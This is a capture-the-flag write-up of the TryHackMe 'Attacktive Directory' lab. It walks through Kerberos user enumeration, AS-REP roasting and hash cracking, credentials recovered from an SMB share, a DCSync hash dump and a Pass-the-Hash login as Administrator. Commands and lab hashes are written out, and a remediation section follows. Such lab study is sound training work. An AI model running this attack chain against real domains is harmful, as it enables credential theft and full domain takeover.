# TryHackMe: Attacktive Directory — Writeup

Room: [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) · Difficulty: Medium

This one's a guided intro to attacking Active Directory: Kerberos username enumeration, AS-REP roasting, an SMB share with leftover creds, a DCSync-capable account, and a Pass-the-Hash finish as Administrator. Walking through it task by task below.

One heads-up before we start: my target IP changed mid-engagement, from `10.48.187.180` during recon to `10.48.149.29` by the time I got to `secretsdump`/Evil-WinRM. That's just THM spinning up a fresh VM on reconnect, not a typo — commands below use whichever IP was live at the time.

## Task 2 — Recon

Kicked off with Rustscan feeding into Nmap:

```bash
rustscan -a 10.48.187.180 -- -sC -sV -A
```

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped (LDAPS)
3268/tcp  open  ldap          Global Catalog (Domain: spookysec.local)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing (AD Web Services)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

88, 389, 445, 464, 3268, 9389 all open on one box is the standard tell for a Domain Controller — this is `spookysec.local`.

## Task 3 — Enumerating the DC (SMB/NetBIOS)

```bash
enum4linux 10.48.187.180
```

That gave up the domain and DC name straight away:

```
Domain: spookysec.local
DC: AttacktiveDirectory.spookysec.local
```

**Q&A:**
1. What tool will allow us to enumerate port 139/445? → `enum4linux`
2. What is the NetBIOS-Domain Name of the machine? → `THM-AD`
3. What invalid TLD do people commonly use for their Active Directory Domain? → `.local`

## Task 4 — Enumerating users via Kerberos (Kerbrute)

```bash
kerbrute userenum -d spookysec.local --dc AttacktiveDirectory.spookysec.local ./users.txt
```

Against the supplied wordlist, Kerbrute confirmed 11 valid usernames — and, more interestingly, flagged one account that doesn't need Kerberos pre-auth at all:

```
[+] VALID USERNAME: james@spookysec.local
[+] svc-admin has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:408ee4a3e91ec877b931d35c56364c77$...
[+] VALID USERNAME: svc-admin@spookysec.local
[+] VALID USERNAME: robin@spookysec.local
[+] VALID USERNAME: darkstar@spookysec.local
[+] VALID USERNAME: administrator@spookysec.local
[+] VALID USERNAME: backup@spookysec.local
[+] VALID USERNAME: paradox@spookysec.local
```

Because `svc-admin` has `UF_DONT_REQUIRE_PREAUTH` set, the KDC hands back an AS-REP encrypted with that account's password-derived key to anyone who asks — no credentials required. Classic **AS-REP Roasting**.

**Q&A:**
1. What command within Kerbrute will allow us to enumerate valid usernames? → `userenum`
2. What notable account is discovered? → `svc-admin`
3. What is the other notable account discovered? → `backup`

## Task 5 — Cracking the AS-REP hash

```bash
echo '$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:408ee4a3e91ec877b931d35c56364c77$...' > hash.txt
hashcat -m 18200 hash.txt passwordlist.txt -o crack_hash.txt
cat crack_hash.txt
```

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005
```

**Q&A:**
1. Which user account can you query a ticket from with no password? → `svc-admin`
2. What type of Kerberos hash did we retrieve from the KDC? → `Kerberos 5 AS-REP etype 18`
3. What mode is the hash? → `18200`
4. Crack the hash — what's the password? → `management2005`

**Creds so far:** `svc-admin:management2005`

## Task 6 — Abusing SMB shares

```bash
smbclient -L //spookysec.local -U svc-admin%management2005
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

`backup` isn't a default share — worth a look:

```bash
smbclient //spookysec.local/backup -U svc-admin%management2005
smb: \> get backup_credentials.txt
cat backup_credentials.txt
```

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Base64, decodes straight to another credential pair:

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
```

```
backup@spookysec.local:backup2517860
```

**Q&A:**
1. What utility can we use to map remote SMB shares? → `smbclient`
2. Which option will list shares? → `-L`
3. How many remote shares is the server listing? → `6`
4. Which share contains a text file? → `backup`
5. Contents of the file? → `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
6. Decoded contents? → `backup@spookysec.local:backup2517860`

## Task 7 — DCSync via DRSUAPI

The `backup` account turned out to hold directory-replication rights — enough for Impacket's `secretsdump.py` to clone the domain's secrets straight off the DC:

```bash
secretsdump.py spookysec.local/backup:backup2517860@10.48.149.29
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:...
krbtgt:502:...
spookysec.local\svc-admin:1114:...:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:...:19741bde08e135f4b40f1ca9aab45538:::
...
```

Full NTLM hash dump for every domain account, Administrator included.

**Q&A:**
1. What method allowed us to dump NTDS.DIT? → `DRSUAPI`
2. What is the Administrator's NTLM hash? → `0e0363213e37b94221497260b0bcb4fc`
3. What attack lets us authenticate as the user without the password? → `Pass The Hash`
4. Evil-WinRM option to use a hash instead of a password? → `-H`

## Task 8 — Pass-the-Hash to Administrator

```bash
evil-winrm -i 10.48.149.29 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Straight in as `Administrator` — no plaintext password ever needed, just the hash dumped in Task 7.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> download root.txt
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> download "C:/Users/svc-admin/Desktop/user.txt.txt"
*Evil-WinRM* PS C:\Users\backup\Desktop> download "C:/Users/backup/Desktop/PrivEsc.txt"
```

### Flags

| Account | Flag |
|---|---|
| svc-admin | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| backup | `TryHackMe{B4ckM3UpSc0tty!}` |
| Administrator | `TryHackMe{4ctiveD1rectoryM4st3r}` |

- **User:** `TryHackMe{K3rb3r0s_Pr3_4uth}`
- **Root:** `TryHackMe{4ctiveD1rectoryM4st3r}`

## Root causes / lessons

1. **`UF_DONT_REQUIRE_PREAUTH` on `svc-admin`** — any unauthenticated user can request and crack this account's AS-REP offline (AS-REP Roasting). Fix: require Kerberos pre-auth on every account, and use strong, non-dictionary passwords on service accounts specifically.
2. **Over-permissioned `backup` account** — a low-privilege-looking account effectively had domain-replication rights (`Replicating Directory Changes All`), turning any compromise of it into a full DCSync. Replication rights should sit only on real DC/backup infrastructure accounts.
3. **Credentials stored in a world-readable SMB share** — `backup_credentials.txt` was base64, not encrypted, sitting on a share reachable with low-privilege creds. Base64 is encoding, not protection.
4. **No hash segmentation** — once NTDS.DIT was dumped, every NTLM hash (Administrator's included) was immediately reusable via Pass-the-Hash. Rotated local/privileged credentials (LAPS) and NTLM-reuse mitigations (Credential Guard, restricting NTLM) would blunt this last step.

## Appendix

- `users.txt` — username wordlist fed to `kerbrute userenum`
- `passwordlist.txt` — wordlist used for the hashcat crack of the AS-REP hash
- `hash.txt` — the captured `$krb5asrep$23$...` hash
- `crack_hash.txt` — hashcat output (`hash:management2005`)
- `backup_credentials.txt` — base64 blob recovered from the `backup` SMB share
